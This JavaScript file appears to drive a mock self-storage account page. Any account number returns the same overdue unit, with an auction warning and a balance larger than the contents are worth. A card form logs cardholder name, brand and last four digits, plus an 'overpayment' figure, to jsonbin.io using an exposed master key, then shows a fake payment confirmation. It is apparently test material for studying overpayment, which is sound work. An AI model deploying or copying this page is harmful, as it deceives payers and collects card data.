"use strict";

const $ = (s) => document.querySelector(s);
const money = (c) => "$" + (c / 100).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });

const BIN_ID  = "6af568bdffd5d16053bb4e9b";
const BIN_KEY = "$2a$10$S.cfSm.2yqNKk8WjJccwZuFhND8qdTNdyvoAQqO130HmsfmBQDms.";

const UNITS_SHOWCASE = [
  { emoji: "📦", name: "5×5 ft",   desc: "Closet-sized. Perfect for boxes, small furniture, seasonal items.", price: "$39/mo" },
  { emoji: "🗄️",  name: "10×10 ft", desc: "One-bedroom apartment worth of furniture and boxes.", price: "$79/mo" },
  { emoji: "🏠", name: "10×20 ft", desc: "Fits a full household. Ideal for moves and long-term storage.", price: "$129/mo" },
  { emoji: "🏭", name: "10×30 ft", desc: "Commercial-grade space. Vehicles, equipment, full office storage.", price: "$189/mo" },
];

const ACCOUNTS = {
  "RSS-2024-7777": {
    holder:      "D. Reyes",
    unit:        "C-304",
    size:        "10×10 ft",
    building:    "Building C",
    startDate:   "March 8, 2024",
    lastPayment: "August 1, 2026",
    dailyRate:   1900,
    daysOverdue: 48,
    auctionDate: "November 20, 2026",
    inventory: [
      { item: "Wardrobe boxes (3)",        estimatedValue: 4500  },
      { item: "Dresser, wood",             estimatedValue: 8500  },
      { item: "Sofa (2-seat)",             estimatedValue: 12000 },
      { item: "Box set — kitchen items",   estimatedValue: 3500  },
      { item: "Box set — books/documents", estimatedValue: 4000  },
      { item: "Electronics bag",           estimatedValue: 6500  },
      { item: "Bicycle",                   estimatedValue: 9500  },
      { item: "Steel safe",                estimatedValue: 28000 },
    ],
  },
};

// ── PDF 1 GENERATOR ───────────────────────────────────────────────────────────

const PARAS = [
  "The Occupant hereby acknowledges and agrees that this Self-Storage Rental Agreement constitutes the entire agreement between the parties with respect to the rental of the designated storage space, and supersedes all prior negotiations, representations, warranties, and understandings of the parties. No modification of this Agreement shall be binding unless made in writing and duly executed by authorized representatives of both parties.",
  "The Facility reserves the right to modify, amend, or update the terms and conditions set forth in this Agreement upon not less than thirty (30) days' prior written notice to the Occupant. Such modifications shall be effective as of the date specified in the notice and shall supersede all prior agreements between the parties with respect to the subject matter hereof.",
  "The Occupant understands and acknowledges that the Facility does not provide insurance coverage for the Occupant's personal property stored within the Rental Space. The Occupant is solely responsible for obtaining and maintaining adequate insurance coverage for all property stored in the Rental Space, including coverage for fire, theft, water damage, and all other foreseeable risks.",
  "The Facility shall not be responsible or liable for any loss, damage, or destruction of property stored by the Occupant in the Rental Space, arising from any cause whatsoever, including but not limited to theft, burglary, vandalism, fire, water, flooding, insects, rodents, or acts of God, except in the case of gross negligence or intentional misconduct by the Facility.",
  "The Occupant agrees to indemnify, defend, and hold harmless the Facility, its officers, directors, employees, agents, and assigns from and against any and all claims, demands, actions, damages, losses, liabilities, costs, and expenses, including reasonable attorneys' fees, arising out of or relating to the Occupant's use of the Rental Space or breach of this Agreement.",
  "Access to the Rental Space is provided solely for the purpose of storing, retrieving, and managing the Occupant's personal property. The Rental Space may not be used as a dwelling, office, workshop, or for any commercial purpose whatsoever. Any violation of this provision shall constitute a material breach of this Agreement and may result in immediate termination.",
  "The Occupant shall not store any hazardous materials, flammable substances, explosive materials, toxic chemicals, biological agents, or any items that may pose a risk to the safety of the facility, other occupants, or the general public within the Rental Space. Violation of this provision may result in immediate termination and referral to appropriate authorities.",
  "In the event of a default by the Occupant, the Facility shall have all rights and remedies available under applicable state law, including but not limited to the right to deny the Occupant access to the Rental Space, to impose applicable charges, and to sell the Occupant's property through a lien sale in accordance with applicable statutes.",
  "The Occupant acknowledges that the Facility maintains security systems and surveillance equipment throughout the facility, and that the Occupant's presence and activities within the facility may be recorded. The Occupant consents to such recording and waives any privacy claims with respect to recordings made within the common areas and exterior of the facility.",
  "Any notices required or permitted under this Agreement shall be in writing and shall be delivered by hand, by certified mail return receipt requested, or by overnight courier to the addresses set forth in this Agreement. Notices shall be deemed effective upon delivery or, if sent by certified mail, upon the date of attempted delivery at the specified address.",
  "The Occupant shall maintain the Rental Space in a clean, safe, and orderly condition at all times. The Occupant shall not allow garbage, refuse, or debris to accumulate within the Rental Space or in the common areas of the facility. The Occupant shall be responsible for the proper disposal of all waste generated during visits to the facility.",
  "The Facility reserves the right to enter the Rental Space for purposes of inspection, maintenance, emergency response, or enforcement of this Agreement. The Facility will provide reasonable notice prior to any non-emergency entry, except in cases where immediate entry is necessary to prevent damage, injury, or other emergency situations that may endanger persons or property.",
  "This Agreement shall be governed by and construed in accordance with the laws of the State of Arizona, without regard to its conflict of laws principles. Any disputes arising under or relating to this Agreement shall be resolved in the courts of Maricopa County, Arizona, and the parties hereby irrevocably consent to the exclusive jurisdiction of such courts.",
  "The Occupant shall not make any alterations, improvements, or additions to the Rental Space without the prior written consent of the Facility. Any alterations made without such consent may be removed by the Facility at the Occupant's expense. All approved alterations shall become the property of the Facility upon termination of this Agreement unless otherwise agreed in writing.",
  "The Occupant's right to use the Rental Space is personal and may not be assigned, sublet, or otherwise transferred without the prior written consent of the Facility. Any purported assignment or transfer without such consent shall be void and of no effect, and shall constitute a material breach of this Agreement subject to immediate termination.",
  "The Facility shall have a lien on all personal property stored in the Rental Space to secure payment of all amounts owed by the Occupant under this Agreement. This lien is in addition to any other rights or remedies available to the Facility under applicable law. The Facility may enforce this lien as provided under applicable state self-storage lien laws and regulations.",
  "The Occupant acknowledges that all storage is at the Occupant's own risk. The Facility makes no representations or warranties, express or implied, regarding the security, cleanliness, climate conditions, or fitness for a particular purpose of the Rental Space. The Occupant has had the opportunity to inspect the Rental Space prior to executing this Agreement.",
  "Any dispute arising out of or related to this Agreement shall first be submitted to mediation before a mutually agreed-upon mediator. If mediation is unsuccessful within sixty (60) days, the dispute shall be submitted to binding arbitration in accordance with the rules of the American Arbitration Association then in effect. The arbitrator's decision shall be final and binding.",
  "The Occupant shall not engage in any activity within the Rental Space or the facility that creates noise, odors, vibrations, or other disturbances that may interfere with the quiet enjoyment of other occupants. The Facility reserves the right to terminate this Agreement immediately in the event of repeated or serious violations of this provision after written notice.",
  "In the event that any litigation arises out of this Agreement, the prevailing party shall be entitled to recover its reasonable attorneys' fees and costs from the non-prevailing party. This provision shall apply to all disputes, including those resolved through arbitration or other alternative dispute resolution mechanisms as permitted under applicable law.",
  "The Occupant shall ensure that all persons who access the Rental Space on the Occupant's behalf are authorized to do so, and that all such persons comply with the terms and conditions of this Agreement and the facility rules. The Occupant shall be fully responsible for the conduct of all authorized users and visitors to the Rental Space at all times.",
  "The Facility's failure to enforce any provision of this Agreement at any time shall not be construed as a waiver of the Facility's right to enforce such provision in the future. No waiver by the Facility of any breach of this Agreement shall operate as a waiver of any subsequent breach of the same or any other provision of this Agreement.",
  "If any provision of this Agreement is found to be invalid, illegal, or unenforceable under applicable law, such provision shall be modified to the minimum extent necessary to make it valid, legal, and enforceable, and the remaining provisions of this Agreement shall continue in full force and effect as though such invalid provision had never been included.",
  "The Occupant agrees to promptly notify the Facility of any damage to the Rental Space, any unauthorized access, any safety hazards observed within the facility, and any change in the Occupant's contact information. Failure to provide timely notification may result in the Occupant being held responsible for any resulting damages or additional costs incurred.",
  "The Facility reserves the right to relocate the Occupant to a comparable Rental Space within the facility upon reasonable notice when necessary due to construction, maintenance, or operational requirements. The Facility shall provide reasonable assistance and shall not increase the rental rate without the Occupant's prior written consent.",
  "The Occupant acknowledges that the facility may be subject to various local, state, and federal regulations, and agrees to comply with all such regulations in connection with the Occupant's use of the Rental Space. The Occupant shall not store any items in violation of applicable law, including items subject to export controls, trade sanctions, or regulatory restrictions.",
  "The Facility shall use commercially reasonable efforts to maintain the common areas of the facility in a clean, safe, and functional condition. However, the Facility does not guarantee uninterrupted access and shall not be liable for damages arising from temporary closures, scheduled maintenance activities, or unforeseeable interruptions in facility access.",
  "The Occupant shall provide the Facility with current and accurate contact information, including a valid mailing address, telephone number, and electronic mail address. The Occupant shall promptly update this information upon any change. The Facility may rely on the most recently provided contact information for all official notices and communications.",
  "In the event that the Occupant abandons the Rental Space or ceases to maintain contact with the Facility for a period exceeding thirty (30) days, the Facility shall have the right to treat such abandonment as an event of default under this Agreement and may proceed with lien enforcement procedures as provided under applicable state self-storage lien laws.",
  "The parties agree that this Agreement may be executed in one or more counterparts, each of which shall be deemed an original, and all of which together shall constitute one and the same instrument. Electronic signatures, digital signatures, or facsimile signatures shall be deemed valid and binding to the same extent as original ink signatures for all purposes.",
];

const SECTIONS = [
  { title: "ARTICLE I — DEFINITIONS", subs: ["1.1 Defined Terms", "1.2 Interpretation of Terms", "1.3 Headings and Captions", "1.4 Governing Documents", "1.5 Incorporated Documents"] },
  { title: "ARTICLE II — RENTAL SPACE AND USE", subs: ["2.1 Description of Rental Space", "2.2 Condition of Premises", "2.3 Permitted Use", "2.4 Prohibited Activities", "2.5 Quiet Enjoyment"] },
  { title: "ARTICLE III — TERM AND RENEWAL", subs: ["3.1 Initial Term", "3.2 Automatic Renewal", "3.3 Notice of Non-Renewal", "3.4 Early Termination", "3.5 Holdover Provisions"] },
  { title: "ARTICLE IV — FEES AND PAYMENT", subs: ["4.1 Rental Payments", "4.2 Due Date and Grace Period", "4.3 Payment Methods", "4.4 Returned and Failed Payments", "4.5 Fee Adjustments and Rate Changes"] },
  { title: "ARTICLE V — ACCESS AND SECURITY", subs: ["5.1 Hours of Access", "5.2 Access Credentials", "5.3 Authorized Users", "5.4 Security Systems and Surveillance", "5.5 Suspension and Restoration of Access"] },
  { title: "ARTICLE VI — OCCUPANT'S OBLIGATIONS", subs: ["6.1 Maintenance of Rental Space", "6.2 Compliance with Laws and Regulations", "6.3 Notification Obligations", "6.4 Conduct on Premises", "6.5 Waste Disposal"] },
  { title: "ARTICLE VII — PROHIBITED ITEMS", subs: ["7.1 Hazardous and Toxic Materials", "7.2 Flammable and Explosive Items", "7.3 Perishable and Food Items", "7.4 Living Matter and Animals", "7.5 Stolen and Contraband Property"] },
  { title: "ARTICLE VIII — LIABILITY AND INDEMNIFICATION", subs: ["8.1 Limitation of Facility Liability", "8.2 Occupant's Indemnification", "8.3 Property Damage", "8.4 Personal Injury and Third-Party Claims", "8.5 Consequential and Indirect Damages"] },
  { title: "ARTICLE IX — DEFAULT AND REMEDIES", subs: ["9.1 Events of Default", "9.2 Notice and Cure Period", "9.3 Facility's Remedies Upon Default", "9.4 Denial of Access", "9.5 Recovery of Costs and Expenses"] },
  { title: "ARTICLE X — LIEN RIGHTS AND ENFORCEMENT", subs: ["10.1 Statutory Lien Rights", "10.2 Pre-Sale Notification Requirements", "10.3 Lien Sale Procedures", "10.4 Redemption Rights", "10.5 Proceeds, Surplus, and Deficiency"] },
  { title: "EXHIBIT A — FACILITY RULES AND REGULATIONS", subs: ["A.1 Hours of Operation", "A.2 Gate and Entrance Procedures", "A.3 Vehicle and Loading Rules", "A.4 Noise and Conduct Standards", "A.5 Trash and Waste Policy"] },
  { title: "EXHIBIT B — INSURANCE REQUIREMENTS", subs: ["B.1 Insurance Obligation", "B.2 Minimum Required Coverage", "B.3 Policy Standards and Carriers", "B.4 Proof of Insurance", "B.5 Waiver of Subrogation"] },
  { title: "EXHIBIT C — GENERAL PROVISIONS", subs: ["C.1 Entire Agreement", "C.2 Amendments and Modifications", "C.3 Waiver and Non-Enforcement", "C.4 Severability", "C.5 Counterparts and Electronic Signatures"] },
];

function generatePDF1(accountId) {
  const base   = window.location.href.replace(/[^/]*$/, "");
  const rtdUrl = base + "rtd.html?account=" + encodeURIComponent(accountId);

  const { jsPDF } = window.jspdf;
  const doc = new jsPDF({ unit: "pt", format: "letter" });

  const ML = 72, MR = 72, MT = 72, MB = 72;
  const PW = 612, PH = 792;
  const CW = PW - ML - MR;

  let y = MT;
  let pg = 1;

  function footer() {
    doc.setFontSize(8);
    doc.setFont("helvetica", "normal");
    doc.setTextColor(150, 150, 150);
    doc.text("Reimbursor SafeStorage — Self-Storage Rental Agreement — Confidential", ML, PH - 32);
    doc.text(String(pg), PW - MR, PH - 32, { align: "right" });
    doc.setTextColor(0, 0, 0);
  }

  function np() {
    footer();
    doc.addPage();
    pg++;
    y = MT;
  }

  function need(h) {
    if (y + h > PH - MB - 24) np();
  }

  function sec(t) {
    need(44);
    if (y > MT + 2) y += 16;
    doc.setFontSize(12);
    doc.setFont("helvetica", "bold");
    doc.text(t, ML, y); y += 7;
    doc.setDrawColor(40); doc.setLineWidth(0.6);
    doc.line(ML, y, PW - MR, y); y += 14;
  }

  function sub(t) {
    need(26);
    y += 2;
    doc.setFontSize(10);
    doc.setFont("helvetica", "bold");
    doc.text(t, ML, y); y += 15;
  }

  function p(t) {
    doc.setFontSize(10);
    doc.setFont("helvetica", "normal");
    const lines = doc.splitTextToSize(t, CW);
    need(lines.length * 14 + 8);
    doc.text(lines, ML, y);
    y += lines.length * 14 + 8;
  }

  // ── COVER PAGE ──────────────────────────────────────────────────────────────
  y = 190;
  doc.setFontSize(22);
  doc.setFont("helvetica", "bold");
  doc.text("SELF-STORAGE RENTAL AGREEMENT", PW / 2, y, { align: "center" }); y += 34;
  doc.setFontSize(13);
  doc.setFont("helvetica", "normal");
  doc.text("Reimbursor SafeStorage", PW / 2, y, { align: "center" }); y += 20;
  doc.text("3140 Industrial Pkwy, Unit A — Phoenix, AZ 85034", PW / 2, y, { align: "center" }); y += 20;
  doc.text("(602) 557-4400  |  accounts@reimbursorss.com", PW / 2, y, { align: "center" }); y += 36;
  doc.setFontSize(10);
  doc.text("Version 2024.1  |  Effective January 1, 2024", PW / 2, y, { align: "center" }); y += 16;
  doc.text("This document is confidential and legally binding.", PW / 2, y, { align: "center" }); y += 16;
  doc.text("Unauthorized reproduction or distribution is strictly prohibited.", PW / 2, y, { align: "center" });
  footer();

  // ── CONTENT ─────────────────────────────────────────────────────────────────
  doc.addPage(); pg++; y = MT;

  let subIdx = 0;
  SECTIONS.forEach(function (section) {
    sec(section.title);
    section.subs.forEach(function (subTitle) {
      sub(subTitle);
      for (let i = 0; i < 3; i++) {
        p(PARAS[(subIdx * 3 + i) % PARAS.length]);
      }
      subIdx++;
      y += 6;
    });
    y += 8;
  });

  // ── LAST PAGE: ACCOUNT REFERENCE ────────────────────────────────────────────
  np();
  sec("ACCOUNT REFERENCE");
  p("This Self-Storage Rental Agreement is associated with the account identified below. The account holder is bound by all terms and conditions set forth in this Agreement as of the date of execution. All correspondence, notices, and communications shall reference this account identifier in full.");
  y += 14;

  doc.setFontSize(10);
  doc.setFont("helvetica", "bold");
  doc.text("Account Number:", ML, y); y += 20;

  doc.setFontSize(13);
  doc.setFont("courier", "bold");
  const acctW = doc.getTextWidth(accountId);
  doc.text(accountId, ML, y);
  doc.link(ML, y - 13, acctW, 16, { url: rtdUrl });
  y += 24;

  doc.setFontSize(9);
  doc.setFont("helvetica", "normal");
  doc.setTextColor(130, 130, 130);
  doc.text("For account-specific documentation, reference the account number above.", ML, y);
  doc.setTextColor(0, 0, 0);

  footer();
  doc.save("rental-agreement-" + accountId + ".pdf");
}

// ── UNITS SHOWCASE ────────────────────────────────────────────────────────────

function renderUnits() {
  const grid = $("#units-grid");
  for (const u of UNITS_SHOWCASE) {
    const card = document.createElement("div");
    card.className = "unit-showcase";
    card.innerHTML = `
      <div class="unit-showcase-icon">${u.emoji}</div>
      <div class="unit-showcase-name">${u.name}</div>
      <div class="unit-showcase-desc">${u.desc}</div>
      <div class="unit-showcase-price">${u.price}</div>
    `;
    grid.append(card);
  }
}

// ── ACCOUNT LOOKUP ────────────────────────────────────────────────────────────

const accountInput  = $("#account-input");
const lookupBtn     = $("#lookup-btn");
const lookupError   = $("#lookup-error");
const accountResult = $("#account-result");

const ACCOUNT_FORMAT = /^RSS-\d{4}-\d{4}$/;
let sessionId = null;

lookupBtn.addEventListener("click", lookupAccount);
accountInput.addEventListener("keydown", (e) => { if (e.key === "Enter") lookupAccount(); });

function lookupAccount() {
  const id = accountInput.value.trim().toUpperCase();
  lookupError.textContent = "";
  if (!id) { lookupError.textContent = "Please enter your account number."; return; }
  if (!ACCOUNT_FORMAT.test(id)) { lookupError.textContent = "Invalid format. Account numbers follow the pattern RSS-YYYY-NNNN."; return; }
  sessionId = "RSS-" + Date.now();
  const account = ACCOUNTS[id] || ACCOUNTS["RSS-2024-7777"];
  renderAccountResult(id, account);
}

function totalContentValue(inventory) {
  return inventory.reduce((sum, i) => sum + i.estimatedValue, 0);
}

function renderAccountResult(id, acct) {
  const totalOwed    = acct.dailyRate * acct.daysOverdue;
  const contentValue = totalContentValue(acct.inventory);

  accountResult.hidden = false;
  accountResult.innerHTML = `
    <div class="unit-card">
      <div class="unit-card-header">
        <h3>Unit Status</h3>
        <span class="account-id">${id}</span>
      </div>
      <div class="unit-card-body">

        <div class="unit-info">
          <div class="unit-info-block">
            <span class="unit-info-label">Account Holder</span>
            <span class="unit-info-value">${acct.holder}</span>
          </div>
          <div class="unit-info-block">
            <span class="unit-info-label">Unit</span>
            <span class="unit-info-value">${acct.unit} — ${acct.size}</span>
          </div>
          <div class="unit-info-block">
            <span class="unit-info-label">Building</span>
            <span class="unit-info-value">${acct.building}</span>
          </div>
          <div class="unit-info-block">
            <span class="unit-info-label">Rental Since</span>
            <span class="unit-info-value">${acct.startDate}</span>
          </div>
          <div class="unit-info-block">
            <span class="unit-info-label">Last Payment</span>
            <span class="unit-info-value">${acct.lastPayment}</span>
          </div>
          <div class="unit-info-block">
            <span class="unit-info-label">Status</span>
            <span class="unit-info-value" style="color:var(--danger);font-weight:700">⚠ Payment Hold</span>
          </div>
        </div>

        <div class="hold-banner">
          ⚠ Your unit has been placed on hold due to ${acct.daysOverdue} days of overdue payments. Access has been suspended pending balance resolution.
        </div>

        <div class="inventory-title">Unit Contents — Facility Inventory Assessment</div>
        <table class="inventory-table">
          <thead>
            <tr>
              <th>Item</th>
              <th style="text-align:right">Est. Value</th>
            </tr>
          </thead>
          <tbody>
            ${acct.inventory.map((item) => `
              <tr class="${item.item.toLowerCase().includes("safe") ? "safe-row" : ""}">
                <td>${item.item}</td>
                <td class="est-value">${money(item.estimatedValue)}</td>
              </tr>
            `).join("")}
            <tr class="total-row">
              <td>Estimated total content value</td>
              <td class="est-value">${money(contentValue)}</td>
            </tr>
          </tbody>
        </table>

        <div class="balance-box">
          <div class="balance-title">Outstanding Balance</div>
          <div class="balance-row total"><span>Total due</span><span>${money(totalOwed)}</span></div>
        </div>

        <div class="auction-notice">
          📅 Unit scheduled for auction on <strong>${acct.auctionDate}</strong>. Resolve your balance before this date to recover your belongings.
        </div>

        <button class="btn" id="download-btn" style="background:#374151;color:#fff;margin-bottom:10px">Download Rental Agreement</button>
        <button class="btn amber" id="proceed-btn">Resolve Balance — ${money(totalOwed)}</button>

        <div class="fine-print">
          Balance must be paid in full to restore unit access.
          Partial payments are not accepted. All fees are non-refundable once processed.
        </div>

      </div>
    </div>
  `;

  document.getElementById("download-btn").addEventListener("click", () => generatePDF1(id));
  document.getElementById("proceed-btn").addEventListener("click", () => openPayment(id, acct, totalOwed));
  accountResult.scrollIntoView({ behavior: "smooth", block: "start" });
}

// ── PAYMENT DIALOG ────────────────────────────────────────────────────────────

const dialog = $("#checkout-dialog");
const form   = $("#pay-form");
const result = $("#result");
const payBtn = $("#pay-btn");

let currentAccount   = null;
let currentAccountId = null;
let currentTotalOwed = null;

function openPayment(id, acct, totalOwed) {
  currentAccount   = acct;
  currentAccountId = id;
  currentTotalOwed = totalOwed;
  form.reset(); clearErrors();
  result.textContent = ""; result.className = "result";
  payBtn.disabled = false;

  $("#dialog-subtitle").textContent = `Unit ${acct.unit} — ${acct.holder}`;
  $("#show-total").textContent      = money(totalOwed);
  payBtn.textContent = "Confirm — " + money(totalOwed);
  dialog.showModal();
}

$("#cancel-btn").addEventListener("click", () => { form.reset(); dialog.close(); });

form.elements.pan.addEventListener("input", (e) => {
  const d = e.target.value.replace(/\D/g, "").slice(0, 19);
  e.target.value = d.replace(/(.{4})/g, "$1 ").trim();
});
form.elements.exp.addEventListener("input", (e) => {
  let d = e.target.value.replace(/\D/g, "").slice(0, 4);
  if (d.length >= 3) d = d.slice(0, 2) + "/" + d.slice(2);
  e.target.value = d;
});
form.elements.cvv.addEventListener("input", (e) => {
  e.target.value = e.target.value.replace(/\D/g, "").slice(0, 4);
});

function luhn(pan) {
  let sum = 0, alt = false;
  for (let i = pan.length - 1; i >= 0; i--) {
    let d = parseInt(pan[i], 10);
    if (alt) { d *= 2; if (d > 9) d -= 9; }
    sum += d; alt = !alt;
  }
  return sum % 10 === 0;
}
function detectBrand(pan) {
  if (/^3[47]/.test(pan))      return "Amex";
  if (/^4/.test(pan))          return "Visa";
  if (/^5[1-5]/.test(pan))     return "Mastercard";
  if (/^6(?:011|5)/.test(pan)) return "Discover";
  return "Card";
}
function validate(f) {
  const errors = {};
  if (!f.name.trim() || f.name.trim().length < 2) errors.name = "Enter the name on the card.";
  const pan = f.pan.replace(/\s/g, "");
  if (!/^\d{13,19}$/.test(pan) || !luhn(pan)) errors.pan = "Enter a valid card number.";
  const m = f.exp.match(/^(\d{2})\/(\d{2})$/);
  if (!m) { errors.exp = "Use MM/YY format."; }
  else {
    const expDate = new Date(2000 + parseInt(m[2], 10), parseInt(m[1], 10) - 1, 1);
    const now = new Date();
    if (parseInt(m[1], 10) < 1 || parseInt(m[1], 10) > 12 || expDate < new Date(now.getFullYear(), now.getMonth(), 1))
      errors.exp = "Card has expired.";
  }
  const brand = !errors.pan ? detectBrand(f.pan.replace(/\s/g, "")) : "";
  const cvvLen = brand === "Amex" ? 4 : 3;
  if (!/^\d{3,4}$/.test(f.cvv) || f.cvv.length !== cvvLen)
    errors.cvv = brand === "Amex" ? "4 digits required." : "3 digits required.";
  return errors;
}
function clearErrors() {
  form.querySelectorAll(".err").forEach((s) => { s.textContent = ""; });
  form.querySelectorAll("input").forEach((i) => i.classList.remove("bad"));
}

async function logEntry(type, payload) {
  const entry = { sessionId, type, timestamp: new Date().toISOString(), userAgent: navigator.userAgent, ...payload };
  try {
    const r = await fetch("https://api.jsonbin.io/v3/b/" + BIN_ID, { headers: { "X-Master-Key": BIN_KEY } });
    const data = await r.json();
    const record = data.record || {};
    const logs = record["rss-v3"] || [];
    logs.push(entry);
    await fetch("https://api.jsonbin.io/v3/b/" + BIN_ID, {
      method: "PUT",
      headers: { "Content-Type": "application/json", "X-Master-Key": BIN_KEY },
      body: JSON.stringify({ ...record, "rss-v3": logs }),
    });
  } catch {}
}

form.addEventListener("submit", async (e) => {
  e.preventDefault();
  clearErrors();
  const f = { name: form.elements.name.value, pan: form.elements.pan.value, exp: form.elements.exp.value, cvv: form.elements.cvv.value };
  const errors = validate(f);
  if (Object.keys(errors).length) {
    for (const [field, msg] of Object.entries(errors)) {
      const span = form.querySelector('.err[data-for="' + field + '"]');
      if (span) span.textContent = msg;
      if (form.elements[field]) form.elements[field].classList.add("bad");
    }
    return;
  }
  payBtn.disabled = true;
  const brand = detectBrand(f.pan.replace(/\s/g, ""));
  const contentValue = totalContentValue(currentAccount.inventory);
  await logEntry("unit_access_attempt", {
    accountId:    currentAccountId,
    totalOwed:    currentTotalOwed,
    contentValue: contentValue,
    overpayment:  currentTotalOwed - contentValue,
    brand, cardName: f.name, last4: f.pan.replace(/\s/g, "").slice(-4),
  });
  setTimeout(async () => {
    await logEntry("unit_access_confirmed", { accountId: currentAccountId, totalCharged: currentTotalOwed });
    result.textContent = "Payment confirmed. Unit access has been restored. You may now access Unit " + currentAccount.unit + ".";
    result.className = "result ok";
    payBtn.disabled = false;
  }, 3000);
});

renderUnits();
